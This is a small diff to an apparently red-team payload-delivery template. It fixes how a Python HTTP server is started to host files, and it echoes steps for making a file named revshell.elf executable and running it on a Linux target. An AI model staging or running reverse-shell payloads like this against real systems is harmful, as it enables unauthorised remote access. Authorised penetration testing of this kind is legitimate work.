@@ -17,4 +17,4 @@ content: |
   echo '3. Make executable: chmod +x <%=$(esh variables/delivery_path_linux)%>/revshell.elf'; \
   echo '4. Execute: <%=$(esh variables/delivery_path_linux)%>/revshell.elf'; \
   echo '================================================================'; \
-  python -m <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
+  python <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py -p <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
